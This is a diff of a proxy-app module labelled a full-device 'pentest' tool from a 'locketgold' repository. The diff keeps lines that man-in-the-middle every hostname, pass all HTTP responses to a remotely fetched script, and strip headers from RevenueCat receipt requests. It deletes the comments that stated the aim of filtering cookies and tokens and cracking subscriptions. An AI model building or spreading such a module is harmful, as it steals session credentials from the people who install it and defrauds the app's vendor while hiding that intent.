@@ -1,14 +1,7 @@
 #!url=https://raw.githubusercontent.com/tinphuc179-bot/locketgold/refs/heads/main/matintools-v2.sgmodule
 #!name= [FullPentest]matintools.click
-#!desc= Module thu nghiem Pentest toan dien thiet bi
-
 [Script]
-# Cấu hình bắt toàn bộ Response để lọc Cookie/Token và bẻ khóa RevenueCat cùng lúc
 all_traffic = type=http-response, pattern=^https?:\/\/.*, script-path=https://raw.githubusercontent.com/tinphuc179-bot/locketgold/refs/heads/main/LOCKET_M4T.js, requires-body=true, max-size=-1, timeout=60
-
-# Giữ nguyên xóa Header khi gửi request lên hệ thống RevenueCat
 deleteHeader = type=http-request, pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers), script-path=https://raw.githubusercontent.com/tinphuc179-bot/locketgold/refs/heads/main/deleteHeader.js, timeout=60
-
 [MITM]
-# Bật tính năng giải mã cho toàn bộ các tên miền đi qua proxy
 hostname = %APPEND% *
